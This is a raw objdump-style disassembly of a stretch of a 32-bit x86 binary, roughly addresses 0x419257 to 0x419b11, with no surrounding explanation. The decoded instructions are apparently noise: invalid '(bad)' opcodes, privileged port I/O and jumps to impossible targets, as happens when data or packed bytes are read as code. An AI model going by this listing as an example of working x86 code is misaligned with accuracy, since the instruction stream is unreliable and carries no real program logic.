  419257:	add    al,bh
  419259:	fsubrp st(3),st
  41925b:	push   cs
  41925c:	iret   
  41925d:	adc    edx,edx
  41925f:	repnz icebp 
  419261:	(bad)
  419264:	ror    eax,1
  419266:	cli    
  419267:	sar    dl,1
  419269:	aad    0xb5
  41926b:	stc    
  41926c:	iret   
  41926d:	call   0xde154f70
  419272:	repnz in al,0xdd
  419275:	lds    eax,FWORD PTR [eax+esi*8]
  419278:	in     al,0xe1
  41927a:	leave  
  41927b:	pop    es
  41927c:	jmp    0x419258
  41927e:	les    ebp,FWORD PTR [ecx-0x142e3138]
  419284:	(bad)  [eax-0x6383b2b]
  41928a:	mov    ah,0xe9
  41928c:	xlat   BYTE PTR ds:[ebx]
  41928d:	cli    
  41928e:	add    edx,esi
  419290:	int    0xf2
  419292:	icebp  
  419293:	cld    
  419294:	jecxz  0x41928b
  419296:	add    ebx,esi
  419298:	fcmovnb st,st(5)
  41929a:	psubq  mm1,mm1
  41929d:	fdiv   QWORD PTR [edx-0x1e155229]
  4192a3:	into   
  4192a4:	jmp    0x419268
  4192a6:	(bad)  
  4192a7:	(bad)  
  4192a8:	fdivr  st,st(1)
  4192aa:	(bad)  
  4192ab:	cld    
  4192ac:	jmp    0xf64286a1
  4192b1:	mov    esp,0xf9f807c7
  4192b6:	loopne 0x419294
  4192b8:	xbegin 0x41d6eab
  4192be:	in     eax,0xf3
  4192c0:	jmp    0x41926a
  4192c2:	in     eax,dx
  4192c3:	(bad)  
  4192c4:	repz in al,dx
  4192c6:	mov    ebx,0xc9f0b0e0
  4192cb:	mov    ebp,0xeecce1de
  4192d0:	out    0xe5,eax
  4192d2:	add    eax,0xc60ad5d0
  4192d7:	jmp    0xe4ca:0xcfc9e5c6
  4192de:	lock mov cl,0xd7
  4192e2:	(bad)  
  4192e3:	fcmovne st,st(5)
  4192e5:	(bad)  
  4192e7:	out    0xf5,al
  4192e9:	mov    dh,0xcd
  4192eb:	fmul   st(4),st
  4192ed:	fdivrp st(3),st
  4192ef:	call   0xdd286ad2
  4192f4:	fsub   st,st(3)
  4192f6:	ret    
  4192f7:	aam    0xfa
  4192f9:	fiadd  DWORD PTR ds:0xe3f90800
  4192ff:	(bad)  
  419300:	test   al,0xa8
  419302:	ret    0xace6
  419305:	ret    0xb1da
  419308:	vpaddd ymm1,ymm0,ymm0
  41930c:	imul   dh
  41930e:	sar    ch,cl
  419310:	add    esi,esp
  419312:	cli    
  419313:	jecxz  0x4192ec
  419315:	shl    ch,0xfa
  419318:	out    0xcf,eax
  41931a:	fucom  st(3)
  41931c:	std    
  41931d:	adc    ch,BYTE PTR [edx-0x22514f3e]
  419323:	in     al,0xc6
  419325:	leave  
  419326:	loope  0x419327
  419328:	retf   0xe8f3
  41932b:	(bad)  
  41932d:	cli    
  41932e:	fidivr WORD PTR [ebp-0x45291c2a]
  419334:	lock xabort 0x7
  419338:	(bad)  
  419339:	loop   0x419304
  41933b:	pop    es
  41933c:	or     BYTE PTR [eax],al
  41933e:	in     eax,0xbf
  419340:	rol    ebp,1
  419342:	retf   
  419343:	(bad)  
  419344:	jmp    0xf5b9:0xb4c0e1f5
  41934b:	int3   
  41934c:	repnz (bad) 
  41934e:	in     al,dx
  41934f:	rcl    ebx,1
  419351:	loop   0x419331
  419353:	not    al
  419355:	mul    ecx
  419357:	jmp    ecx
  419359:	cli    
  41935a:	(bad)  
  41935b:	(bad)  
  41935d:	in     al,dx
  41935e:	fldl2e 
  419360:	rcl    esi,0xef
  419363:	jmp    0xdac8:0xc6f3e4f1
  41936a:	aad    0xf0
  41936c:	in     al,dx
  41936d:	xlat   BYTE PTR ds:[ebx]
  41936e:	mov    bh,0xc0
  419370:	rol    al,1
  419372:	inc    ecx
  419374:	(bad)  
  419375:	mov    eax,0xc5d9fdf1
  41937a:	call   0xf2438d44
  41937f:	faddp  st(5),st
  419381:	mov    dh,0xcd
  419383:	lods   eax,DWORD PTR ds:[esi]
  419384:	cmc    
  419385:	(bad)
  419388:	enter  0xeeeb,0xdd
  41938c:	out    dx,al
  41938d:	mov    al,0x2
  41938f:	shr    ebp,0xd6
  419392:	call   edi
  419394:	jmp    0x41938c
  419396:	out    0xea,al
  419398:	mov    ebp,0x9cfe1d5
  41939d:	loop   0x419382
  41939f:	int3   
  4193a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193a1:	rcr    esp,0xd7
  4193a4:	not    ebx
  4193a6:	in     al,0xf1
  4193a8:	jmp    0x419381
  4193aa:	leave  
  4193ab:	jmp    0xc7f9:0x3efcee2
  4193b2:	add    BYTE PTR [ebx],al
  4193b4:	in     al,0xbc
  4193b6:	retf   
  4193b7:	hlt    
  4193b8:	std    
  4193b9:	out    dx,al
  4193ba:	or     bh,al
  4193bc:	fucom  st(5)
  4193be:	test   al,0xc4
  4193c0:	enter  0xe4f1,0xd2
  4193c4:	mov    dl,0xb0
  4193c6:	hlt    
  4193c7:	(bad)  
  4193c9:	lock fcom st(0)
  4193cc:	out    dx,eax
  4193cd:	fsub   st(7),st
  4193cf:	rol    bl,0xbf
  4193d2:	ret    0xcbf2
  4193d5:	out    0xc6,eax
  4193d7:	mov    esi,0xcdf90808
  4193dc:	or     ebp,ebp
  4193de:	jmp    0xf8326bcd
  4193e3:	iret   
  4193e4:	lods   al,BYTE PTR ds:[esi]
  4193e5:	mov    edx,0xbab6fbf1
  4193ea:	mov    ecx,0xeedffbf5
  4193ef:	into   
  4193f0:	cli    
  4193f1:	stc    
  4193f2:	std    
  4193f3:	mov    edx,0xc9c2f2e2
  4193f8:	add    cl,BYTE PTR [edx]
  4193fa:	out    0xd,eax
  4193fc:	pminub mm5,QWORD PTR [edx-0x22391f31]
  419403:	out    0xd2,eax
  419405:	mov    al,0xf3
  419407:	int3   
  419408:	sar    dh,cl
  41940a:	retf   0xb1fa
  41940d:	icebp  
  41940e:	rol    BYTE PTR [ebx],cl
  419410:	mov    ebp,0xd4e2f3ff
  419415:	rol    BYTE PTR [ecx],cl
  419417:	or     ebp,eax
  419419:	fimul  DWORD PTR [esi]
  41941b:	int    0xd9
  41941d:	shr    ah,0xb3
  419420:	ror    edx,0xf5
  419423:	out    0xc4,al
  419425:	xlat   BYTE PTR ds:[ebx]
  419426:	fcmovbe st,st(6)
  419428:	aam    0xac
  41942a:	mul    esp
  41942c:	fucomi st,st(2)
  41942e:	ret    0xc301
  419431:	loop   0x419405
  419433:	repnz mov esp,0xdfe808e4
  419439:	std    
  41943a:	fucom  st(2)
  41943c:	iret   
  41943d:	retf   
  41943e:	lods   al,BYTE PTR ds:[esi]
  41943f:	vcmpps ymm0,ymm4,ymm0,0xe5
  419444:	xlat   BYTE PTR ds:[ebx]
  419445:	loopne 0x419433
  419447:	repz fbstp TBYTE PTR [esi+0x3daddbd]
  41944e:	lock rcl edi,1
  419451:	sar    ch,1
  419453:	add    esi,eax
  419455:	(bad)
  419458:	out    0xe1,eax
  41945a:	sti    
  41945b:	jmp    0xc9f07852
  419460:	div    BYTE PTR [ecx-0x3d4c4c33]
  419466:	hlt    
  419467:	push   esi
  419469:	int    0xfb
  41946b:	idiv   BYTE PTR [ebx-0x2f251d08]
  419471:	xlat   BYTE PTR ds:[ebx]
  419472:	loope  0x419453
  419474:	clc    
  419475:	out    0xf5,al
  419477:	aad    0xb
  419479:	add    DWORD PTR [ecx],ecx
  41947b:	into   
  41947c:	pop    es
  41947d:	rol    ch,cl
  41947f:	out    dx,al
  419480:	lock out dx,eax
  419482:	(bad)  
  419483:	shr    ebp,0xc6
  419486:	int    0xf4
  419488:	in     al,dx
  419489:	mov    ch,0xcc
  41948b:	iret   
  41948c:	aad    0xbe
  41948e:	push   eax
  419490:	rol    BYTE PTR [ecx],1
  419492:	in     al,dx
  419493:	rol    DWORD PTR [ecx],1
  419495:	(bad)  
  419497:	(bad)  
  419498:	jmp    0x41949f
  41949a:	loop   0x419488
  41949c:	add    esp,esp
  41949e:	(bad)  
  4194a0:	jmp    0xb6b0:0xdac6d7f2
  4194a7:	aad    0xfb
  4194a9:	in     al,dx
  4194aa:	mov    ah,0xf8
  4194ac:	call   0xe3fc6481
  4194b1:	xlat   BYTE PTR ds:[ebx]
  4194b2:	rcl    ah,0xf4
  4194b5:	ror    edx,0xfa
  4194b8:	jmp    0x4194a9
  4194ba:	into   
  4194bb:	add    ch,ch
  4194bd:	call   0xf1ee598d
  4194c2:	(bad)  
  4194c3:	sti    
  4194c4:	shr    ah,1
  4194c6:	sti    
  4194c7:	scas   al,BYTE PTR es:[edi]
  4194c8:	mov    ecx,0xefedcccc
  4194cd:	sar    DWORD PTR [ebx+eax*1-0x3afb3811],cl
  4194d4:	loopne 0x4194b3
  4194d6:	hlt    
  4194d7:	add    bl,al
  4194d9:	(bad)  
  4194da:	into   
  4194db:	in     al,dx
  4194dc:	retf   0xbd08
  4194df:	mov    esp,0xc7abf2e2
  4194e4:	lock lods al,BYTE PTR ds:[esi]
  4194e6:	out    0xd4,eax
  4194e8:	mov    ch,0xdb
  4194ea:	shl    DWORD PTR [esi-0x2f103727],cl
  4194f0:	sti    
  4194f1:	(bad)  
  4194f3:	add    ah,dl
  4194f5:	inc    ch
  4194f7:	leave  
  4194f8:	sti    
  4194f9:	dec    bl
  4194fb:	fiadd  DWORD PTR [ecx]
  4194fd:	retf   0xbcc0
  419500:	mov    ebp,0xcce5c3d1
  419505:	call   0xe52943ee
  41950a:	in     eax,0xcc
  41950c:	sar    ah,1
  41950e:	mov    ecx,0xf7f6c3b8
  419513:	in     al,dx
  419514:	cld    
  419515:	pop    es
  419516:	jmp    0x4194d6
  419518:	jmp    esp
  41951a:	loopne 0x419518
  41951c:	loope  0x419522
  41951e:	into   
  41951f:	call   0xf1234911
  419524:	in     eax,dx
  419525:	mov    bl,0xd6
  419527:	imul   dl
  419529:	mov    ecx,0xc2eeb9c5
  41952e:	hlt    
  41952f:	loop   0x4194fd
  419531:	stc    
  419532:	(bad)  
  419534:	add    bh,BYTE PTR [esi+edi*8-0x15232a0c]
  41953b:	std    
  41953c:	call   0xe035792a
  419541:	lock bnd call 0xe6f26bfe
  419548:	fdecstp 
  41954a:	call   0x10b591f
  41954f:	sti    
  419550:	out    dx,al
  419551:	sar    edx,1
  419553:	rcl    ah,cl
  419555:	in     al,0xf0
  419557:	leave  
  419558:	clc    
  419559:	loope  0x419563
  41955b:	adc    eax,DWORD PTR ds:0xcbebacf1
  419561:	shl    DWORD PTR [eax-0x1a381805],1
  419567:	int3   
  419568:	fidivr WORD PTR [ecx-0x240d440f]
  41956e:	enter  0xb5b8,0xfd
  419572:	aam    0xff
  419574:	aam    0x3
  419576:	fdiv   st,st(4)
  419578:	aad    0xdb
  41957a:	(bad)
  41957d:	repnz out 0xc7,al
  419580:	loope  0x419577
  419582:	in     eax,0xe3
  419584:	into   
  419585:	mov    ah,0xeb
  419587:	hlt    
  419588:	(bad)  
  419589:	mov    eax,0xbbc8c8fd
  41958e:	repnz fld DWORD PTR [edi]
  419591:	add    BYTE PTR [ecx],al
  419593:	add    al,0xe7
  419595:	out    0xde,al
  419597:	call   0xee407aa7
  41959c:	add    BYTE PTR [ebx],al
  41959e:	into   
  41959f:	mov    esi,0xcae1d6e0
  4195a4:	vpor   ymm3,ymm3,ymm3
  4195a8:	int    0xff
  4195aa:	mov    bh,0xe9
  4195ac:	(bad)  
  4195ad:	test   DWORD PTR [ecx],0xbcede3ce
  4195b3:	std    
  4195b4:	add    al,0x5
  4195b6:	fucomp st(2)
  4195b8:	fst    st(6)
  4195ba:	or     bh,ah
  4195bc:	(bad)  
  4195be:	loopne 0x419583
  4195c0:	(bad)  
  4195c1:	enter  0xf3e0,0xfb
  4195c5:	loopne 0x41957c
  4195c7:	in     eax,dx
  4195c8:	lock icebp 
  4195ca:	out    dx,eax
  4195cb:	int3   
  4195cc:	(bad)  
  4195ce:	in     eax,dx
  4195cf:	icebp  
  4195d0:	int    0xe6
  4195d2:	inc    esi
  4195d4:	(bad)  
  4195d5:	push   es
  4195d6:	inc    ah
  4195d8:	sti    
  4195d9:	mov    esp,0x60cc508
  4195de:	in     eax,dx
  4195df:	in     eax,dx
  4195e0:	loop   0x41958f
  4195e2:	in     al,dx
  4195e3:	retf   0xb0ca
  4195e6:	mov    ah,0xff
  4195e8:	mov    ch,0xdf
  4195ea:	fst    st(2)
  4195ec:	stc    
  4195ed:	mov    esi,0xf2e1dfd0
  4195f2:	xlat   BYTE PTR ds:[ebx]
  4195f3:	or     esp,esi
  4195f5:	jecxz  0x4195b9
  4195f7:	add    dh,bh
  4195f9:	sti    
  4195fa:	out    dx,al
  4195fb:	or     al,0x5
  4195fd:	int    0xbc
  4195ff:	into   
  419600:	shl    ebx,1
  419602:	lods   al,BYTE PTR ds:[esi]
  419603:	lods   eax,DWORD PTR ds:[esi]
  419604:	leave  
  419605:	lods   al,BYTE PTR ds:[esi]
  419606:	sar    dl,cl
  419608:	sar    BYTE PTR [edi-0x310a1432],cl
  41960e:	add    bh,cl
  419610:	ret    0xf9c6
  419613:	(bad)  
  419614:	stc    
  419615:	in     al,0xf9
  419617:	add    ecx,edx
  419619:	aad    0x5
  41961b:	add    al,0xca
  41961d:	ror    al,cl
  41961f:	out    dx,eax
  419620:	repnz shl al,1
  419623:	jmp    0x419608
  419625:	jmp    0xef085cf2
  41962a:	fadd   DWORD PTR [ebx]
  41962c:	retf   0xf6c8
  41962f:	fdivr  QWORD PTR [ebp-0xe2a4412]
  419635:	hlt    
  419636:	div    esi
  419638:	loop   0x4195f6
  41963a:	push   es
  41963b:	retf   0xd3cb
  41963e:	iret   
  41963f:	out    0xea,al
  419641:	retf   0xe5d5
  419644:	in     eax,0xf5
  419646:	into   
  419647:	icebp  
  419648:	(bad)  
  419649:	fnstenv [esi-0x262e0e21]
  41964f:	sti    
  419650:	repz mov ebp,0xe7dfd4c5
  419656:	add    ah,al
  419658:	out    dx,eax
  419659:	in     eax,0xf8
  41965b:	cli    
  41965c:	or     eax,0xe4d8afe6
  419661:	mov    dh,0xd5
  419663:	mov    dl,0xb4
  419665:	retf   
  419666:	(bad)  
  419667:	in     al,0xf2
  419669:	cmc    
  41966a:	imul   bh
  41966c:	mov    eax,0xdee8f4b0
  419671:	out    dx,al
  419672:	ret    0xdcdd
  419675:	add    eax,0xdd8e4dc
  41967a:	fild   WORD PTR [edx+eiz*8]
  41967d:	add    al,0xb1
  41967f:	mov    edi,0xdbeef2d1
  419684:	loop   0x419637
  419686:	jmp    0x419672
  419688:	shr    ah,cl
  41968a:	mov    dh,0xf5
  41968c:	int    0xe1
  41968e:	mov    esp,0xf3f606ff
  419693:	idiv   ch
  419695:	cli    
  419696:	jecxz  0x419658
  419698:	add    ebp,ebx
  41969a:	or     al,0xf4
  41969c:	int    0xf9
  41969e:	iret   
  41969f:	int    0xb0
  4196a1:	int3   
  4196a2:	repnz out 0xcc,al
  4196a5:	repz mov bl,0xeb
  4196a8:	mov    ecx,0xbbcce9fe
  4196ad:	aad    0xc9
  4196af:	in     al,dx
  4196b0:	mul    ebx
  4196b2:	shl    dh,cl
  4196b4:	ret    0xdde2
  4196b7:	stc    
  4196b8:	iret   
  4196b9:	loope  0x4196b4
  4196bb:	fucomp st(4)
  4196bd:	loopne 0x41969c
  4196bf:	test   eax,0xb6afcfc8
  4196c4:	mov    ebx,0xb0d2cde0
  4196c9:	rcr    dh,1
  4196cb:	int3   
  4196cc:	(bad)  
  4196cd:	jmp    0x244558e
  4196d2:	mov    edi,0xfcfbf3f9
  4196d7:	loope  0x4196be
  4196d9:	out    dx,al
  4196da:	enter  0xcc,0x5
  4196de:	(bad)
  4196e1:	ret    0xd5cf
  4196e4:	out    dx,eax
  4196e5:	mov    al,0xfb
  4196e7:	in     eax,dx
  4196e8:	(bad)  
  4196ea:	mov    bh,0xdc
  4196ec:	not    esi
  4196ee:	mov    ebp,0xf7c7fcbe
  4196f3:	out    0xd0,al
  4196f5:	jecxz  0x4196b6
  4196f7:	(bad)  
  4196f8:	(bad)  
  4196fa:	or     eax,0xa90eedee
  4196ff:	lods   al,BYTE PTR ds:[esi]
  419700:	out    dx,eax
  419701:	retf   
  419702:	loopne 0x4196ef
  419704:	repz loop 0x4196f7
  419707:	mov    ecx,0xb9ebc4ed
  41970c:	cld    
  41970d:	repz mov eax,0xf7f3e0e1
  419713:	stc    
  419714:	icebp  
  419715:	rcr    dh,1
  419717:	fdecstp 
  419719:	add    esi,esp
  41971b:	stc    
  41971c:	(bad)
  41971f:	rol    edx,0xa8
  419722:	ror    ebp,cl
  419724:	lods   eax,DWORD PTR ds:[esi]
  419725:	out    dx,eax
  419726:	mov    ch,0xf6
  419728:	into   
  419729:	mov    eax,0xf7bddbed
  41972e:	mov    ebx,0xdc07b8e8
  419733:	shl    esp,cl
  419735:	stc    
  419736:	shl    ah,0xe1
  419739:	retf   
  41973a:	or     BYTE PTR [ebx],al
  41973c:	in     eax,dx
  41973d:	or     cl,al
  41973f:	mov    cl,0xdc
  419741:	jmp    0xeed4:0xd5e8fbf0
  419748:	jmp    FWORD PTR [esi+edi*4-0x16170136]
  41974f:	ret    
  419750:	add    edi,ecx
  419752:	not    ch
  419754:	push   es
  419755:	sti    
  419756:	(bad)  
  419757:	inc    BYTE PTR ds:0x12cccaee
  41975d:	or     ah,dh
  41975f:	out    dx,al
  419760:	(bad)  
  419761:	(bad)  
  419762:	mov    ebp,0xd6b3f6ee
  419767:	sar    esi,1
  419769:	test   ecx,0xf6b8f7c8
  41976f:	(bad)  
  419770:	fsubr  st(5),st
  419772:	mov    ebx,0x8def1fe
  419777:	jmp    0x41977e
  419779:	push   cs
  41977a:	jecxz  0x419787
  41977c:	bswap  ebx
  41977e:	shl    dl,1
  419780:	ret    
  419781:	mov    dl,0xd3
  419783:	mov    ch,0xee
  419785:	out    dx,eax
  419786:	hlt    
  419787:	mov    ah,0xeb
  419789:	mov    bh,0xf5
  41978b:	push   edx
  41978d:	fdiv   st(6),st
  41978f:	mov    edx,0xd2f7bfd9
  419794:	add    esi,edi
  419796:	retf   0xf7f0
  419799:	or     ebx,esp
  41979b:	jecxz  0x419769
  41979d:	in     eax,0xed
  41979f:	lods   al,BYTE PTR ds:[esi]
  4197a0:	mov    esi,0xf3f4bdd2
  4197a5:	(bad)  
  4197a6:	sar    DWORD PTR [ecx-0x1003605],cl
  4197ac:	xlat   BYTE PTR ds:[ebx]
  4197ad:	fcmovnb st,st(1)
  4197af:	shl    bl,cl
  4197b1:	xlat   BYTE PTR ds:[ebx]
  4197b2:	(bad)
  4197b5:	jecxz  0x4197af
  4197b7:	fadd   DWORD PTR [edx]
  4197b9:	cli    
  4197ba:	inc    BYTE PTR [ebx]
  4197bc:	stc    
  4197bd:	in     eax,dx
  4197be:	mov    ecx,0xf4c8d1be
  4197c3:	enter  0xd4f7,0xf4
  4197c7:	rcl    ah,cl
  4197c9:	aad    0xcf
  4197cb:	xlat   BYTE PTR ds:[ebx]
  4197cc:	sar    esp,cl
  4197ce:	iret   
  4197cf:	mov    edx,0xe206db02
  4197d4:	(bad)  
  4197d5:	retf   
  4197d6:	fcomip st,st(7)
  4197d8:	(bad)  
  4197d9:	retf   0xdccf
  4197dc:	jmp    0xd80555f2
  4197e1:	mov    esp,0xf4b6add7
  4197e6:	sti    
  4197e7:	icebp  
  4197e8:	mov    cl,0xe4
  4197ea:	jmp    0x4197c5
  4197ec:	leave  
  4197ed:	lock leave 
  4197ef:	fdiv   st(3),st
  4197f1:	fild   WORD PTR [esi]
  4197f3:	int3   
  4197f4:	sar    esp,cl
  4197f6:	rcr    bl,0x8
  4197f9:	jmp    0xe4c7ff3
  4197fe:	mov    eax,0xbcbdc7c2
  419803:	cmc    
  419804:	retf   
  419805:	(bad)
  419808:	push   DWORD PTR [ecx+edi*8-0x48053441]
  41980f:	loopne 0x4197ec
  419811:	loop   0x419815
  419813:	repz (bad) 
  419815:	or     ebp,ecx
  419817:	not    ebp
  419819:	(bad)  
  41981a:	fcmovne st,st(6)
  41981c:	out    0x12,al
  41981e:	ret    0xe8a8
  419821:	mov    dh,0xf0
  419823:	not    dl
  419825:	(bad)  
  419826:	jmp    0xed3873fd
  41982b:	cld    
  41982c:	(bad)  
  41982d:	(bad)  
  41982f:	xlat   BYTE PTR ds:[ebx]
  419830:	mov    eax,0xf4fce4da
  419835:	(bad)  
  419836:	clc    
  419837:	fnstsw ax
  419839:	or     ch,dh
  41983b:	in     al,0xd9
  41983d:	retf   
  41983e:	fdivr  QWORD PTR [ebp-0x1c38573f]
  419844:	retf   0xcceb
  419847:	fucomip st,st(2)
  419849:	fdivrp st(6),st
  41984b:	fcmove st,st(3)
  41984d:	div    ebp
  41984f:	add    dl,ah
  419851:	fucomip st,st(5)
  419853:	jmp    0x419849
  419855:	add    eax,0x7f5efc9
  41985a:	or     ebx,ebp
  41985c:	add    eax,0xb7e3aa01
  419861:	jecxz  0x419818
  419863:	out    dx,al
  419864:	jmp    0xc73b5f36
  419869:	neg    esp
  41986b:	cmc    
  41986c:	int3   
  41986d:	(bad)  
  41986f:	(bad)  
  419870:	cld    
  419871:	repnz in al,0xc7
  419874:	repz ret 
  419876:	loop   0x419887
  419878:	jmp    0xe74f9551
  41987d:	clc    
  41987e:	(bad)
  419881:	enter  0xc7d1,0xeb
  419885:	mov    ch,0xcd
  419887:	in     al,0xe9
  419889:	mov    eax,0xd4efb2f8
  41988e:	fdivr  st,st(5)
  419890:	(bad)  
  419891:	aam    0xe2
  419893:	cli    
  419894:	aam    0xd8
  419896:	hlt    
  419897:	neg    dh
  419899:	add    eax,0xc9d3ebc4
  41989e:	jmp    0xee284681
  4198a3:	enter  0xeeeb,0xc4
  4198a7:	jmp    0xdb188c81
  4198ac:	fdivrp st(2),st
  4198ae:	(bad)  
  4198af:	call   0xe5196b9a
  4198b4:	ret    
  4198b5:	icebp  
  4198b6:	call   0xff409c97
  4198bb:	in     al,0xee
  4198bd:	adc    al,dl
  4198bf:	(bad)
  4198c2:	jmp    0xeb108c9c
  4198c7:	out    dx,al
  4198c8:	fsubp  st(0),st
  4198ca:	retf   
  4198cb:	clc    
  4198cc:	out    dx,al
  4198cd:	rcr    bl,1
  4198cf:	fsub   st(7),st
  4198d1:	add    ch,ah
  4198d3:	repz neg ch
  4198d6:	loope  0x4198b8
  4198d8:	enter  0x9e6,0xc
  4198dc:	or     esp,edi
  4198de:	test   eax,0xf7b1c3cc
  4198e3:	scas   al,BYTE PTR es:[edi]
  4198e4:	mov    cl,0xaf
  4198e7:	mov    dl,0xcf
  4198e9:	retf   
  4198ea:	in     al,0xee
  4198ec:	mov    cl,0xe1
  4198ee:	std    
  4198ef:	loop   0x4198f3
  4198f1:	faddp  st(0),st
  4198f3:	in     al,0x7
  4198f5:	rol    DWORD PTR [edx],0xc7
  4198f8:	loope  0x4198de
  4198fa:	in     eax,dx
  4198fb:	or     eax,ebp
  4198fd:	fxch   st(5)
  4198ff:	out    dx,eax
  419900:	shl    ebx,1
  419902:	jmp    0x4198db
  419904:	mov    ebx,0xdffbe7f1
  419909:	retf   
  41990a:	jmp    0xd202:0xedf2bcdd
  419911:	shl    ch,1
  419913:	(bad)  
  419915:	cmc    
  419916:	or     DWORD PTR [esi-0x7302038],edi
  41991c:	enter  0xbcdc,0xc8
  419920:	lods   al,BYTE PTR ds:[esi]
  419921:	in     al,dx
  419922:	mov    ebp,0xb1ceade5
  419927:	call   0xd515911e
  41992c:	(bad)  
  41992d:	enter  0xcede,0xed
  419931:	mov    esp,0xc0d40607
  419936:	or     dh,dh
  419938:	jmp    0x419916
  41993a:	hlt    
  41993b:	add    BYTE PTR [edx],cl
  41993d:	out    dx,al
  41993e:	fsub   st,st(2)
  419940:	out    dx,eax
  419941:	lods   eax,DWORD PTR ds:[esi]
  419942:	loop   0x419919
  419944:	leave  
  419945:	icebp  
  419946:	out    dx,al
  419947:	idiv   BYTE PTR [edi-0x43154838]
  41994d:	neg    ch
  41994f:	fsin   
  419951:	rcr    ebx,1
  419953:	(bad)  
  419955:	loopne 0x419938
  419957:	lock jecxz 0x419959
  41995a:	out    0xf,eax
  41995c:	adc    ecx,DWORD PTR ds:0xc4a5efbe
  419962:	test   edx,0xe5e4cad5
  419968:	in     al,0xd3
  41996a:	xlat   BYTE PTR ds:[ebx]
  41996b:	mov    dh,0xce
  41996d:	fld    DWORD PTR [edx]
  41996f:	mov    esp,0xf4bff8bd
  419974:	(bad)  
  419975:	fcmovnu st,st(6)
  419977:	or     BYTE PTR [esi],cl
  419979:	push   es
  41997a:	out    dx,eax
  41997b:	(bad)  
  41997c:	std    
  41997d:	adc    ecx,ecx
  41997f:	out    0xd3,al
  419981:	scas   eax,DWORD PTR es:[edi]
  419982:	retf   
  419983:	shr    esp,0xe5
  419986:	jmp    0xf61d8c64
  41998b:	repnz stc 
  41998d:	mov    eax,0xf8d6d7cd
  419992:	(bad)  
  419993:	or     esp,ebp
  419995:	retf   
  419996:	(bad)  
  419997:	fiadd  WORD PTR [edi]
  419999:	jecxz  0x419964
  41999b:	or     ch,bl
  41999d:	call   0xef0a7853
  4199a2:	jmp    0xf7078472
  4199a7:	mov    edx,0xfbb6d6b6
  4199ac:	jecxz  0x4199a6
  4199ae:	(bad)  
  4199af:	mov    ecx,0xe0f6e1f8
  4199b4:	add    ebx,ebx
  4199b6:	in     al,0xfe
  4199b8:	mov    ebp,0xe5c9e3f8
  4199be:	(bad)  
  4199c0:	rcl    dh,cl
  4199c2:	loope  0x419976
  4199c4:	lds    esi,FWORD PTR [esi-0x1726001f]
  4199ca:	mov    dh,0xcb
  4199cc:	fild   WORD PTR [ecx]
  4199ce:	std    
  4199cf:	rol    edi,cl
  4199d1:	std    
  4199d2:	add    eax,0xd9d6f5f2
  4199d7:	jmp    0x4199bd
  4199d9:	fsubrp st(4),st
  4199db:	mov    ah,0xda
  4199de:	mov    ebp,0xc8d2dde2
  4199e3:	imul   esi
  4199e5:	(bad)  
  4199e7:	fcom   st(2)
  4199e9:	cli    
  4199ea:	(bad)  
  4199ec:	mul    cl
  4199ee:	ret    0xb5d8
  4199f1:	cli    
  4199f2:	rol    BYTE PTR [ebx],1
  4199f4:	aad    0xb
  4199f6:	std    
  4199f7:	aam    0xe9
  4199f9:	shr    dh,0xeb
  4199fc:	or     bl,ch
  4199fe:	fst    st(7)
  419a00:	ror    esi,cl
  419a02:	jmp    0xe8b2:0xd4e2e0b0
  419a09:	(bad)  
  419a0b:	mov    edx,0xe8f8cdd2
  419a10:	fstp   st(7)
  419a12:	mov    esp,0xebf80ad1
  419a17:	(bad)
  419a1a:	jmp    0xe3447925
  419a1f:	idiv   DWORD PTR [edi-0x94f483d]
  419a25:	mov    al,0xcf
  419a27:	lock (bad) 
  419a29:	out    dx,al
  419a2a:	mov    ch,0xb9
  419a2c:	mov    ecx,0xcde0c3be
  419a31:	int3   
  419a32:	inc    DWORD PTR ds:0xd6e5e3c7
  419a38:	fxch   st(6)
  419a3a:	enter  0xc8f8,0xd9
  419a3e:	lods   al,BYTE PTR ds:[esi]
  419a3f:	(bad)  [ebp-0x332f2819]
  419a45:	sar    DWORD PTR [edx-0xe493652],cl
  419a4b:	mov    dl,0xf1
  419a4d:	mov    ah,0xdf
  419a4f:	cmc    
  419a50:	mov    eax,0xdc06bcc3
  419a55:	fucom  st(5)
  419a57:	les    eax,FWORD PTR [eax*8-0x1805f0f4]
  419a5e:	out    dx,al
  419a5f:	shl    esp,0xaf
  419a62:	mov    dl,0xd1
  419a64:	imul   DWORD PTR [esi+edx*8-0x26460e37]
  419a6b:	mov    esi,0xdfbabadc
  419a70:	add    al,bl
  419a72:	loopne 0x419a6c
  419a74:	add    al,bh
  419a76:	(bad)
  419a79:	enter  0xe09,0xc
  419a7d:	retf   
  419a7e:	mov    esi,0xc8ebb3e5
  419a83:	stos   BYTE PTR es:[edi],al
  419a84:	mov    dh,0xf9
  419a86:	mov    cl,0xef
  419a88:	sar    DWORD PTR [ebx-0x280f2017],cl
  419a8e:	(bad)  
  419a90:	int    0x1
  419a92:	sar    eax,0xe2
  419a95:	(bad)  
  419a97:	or     ah,ah
  419a99:	sti    
  419a9a:	push   es
  419a9b:	add    ebx,ebx
  419a9d:	out    0xee,al
  419a9f:	(bad)  
  419aa0:	xlat   BYTE PTR ds:[ebx]
  419aa1:	iret   
  419aa2:	shr    bl,1
  419aa4:	mov    ch,0xf1
  419aa6:	stc    
  419aa7:	call   0xb4fa6384
  419aac:	neg    edx
  419aae:	mov    esp,0xf803d8f9
  419ab3:	loope  0x419a7b
  419ab5:	retf   
  419ab6:	jmp    0xcec6:0x4f6da07
  419abd:	int    0xde
  419abf:	in     al,dx
  419ac0:	test   eax,0xc8edc0c9
  419ac5:	in     eax,dx
  419ac6:	mov    dh,0xb0
  419ac8:	shl    al,1
  419aca:	clc    
  419acb:	retf   0xd1be
  419ace:	xlat   BYTE PTR ds:[ebx]
  419acf:	mov    edx,0xdbfdfbed
  419ad4:	(bad)  
  419ad6:	jmp    0xcb4b62e4
  419adb:	loopne 0x419ad7
  419add:	(bad)  
  419adf:	mov    dl,0xcd
  419ae1:	aad    0xc3
  419ae3:	ret    
  419ae4:	sar    edx,0xd1
  419ae7:	rcl    ch,0xb0
  419aea:	mov    dh,0xef
  419aec:	fmulp  st(1),st
  419aee:	test   al,0xf1
  419af1:	mov    eax,0xfedbf4
  419af6:	aad    0xc8
  419af8:	retf   0xfce6
  419afb:	cld    
  419afc:	dec    bh
  419afe:	iret   
  419aff:	loope  0x419af8
  419b01:	cmc    
  419b02:	shl    bh,1
  419b04:	mov    ah,0xe6
  419b06:	lock (bad) 
  419b08:	mov    ecx,0x3f3f5c6
  419b0d:	loope  0x419aec
  419b0f:	mov    dh,0xf8
  419b11:	fxch   st(5)
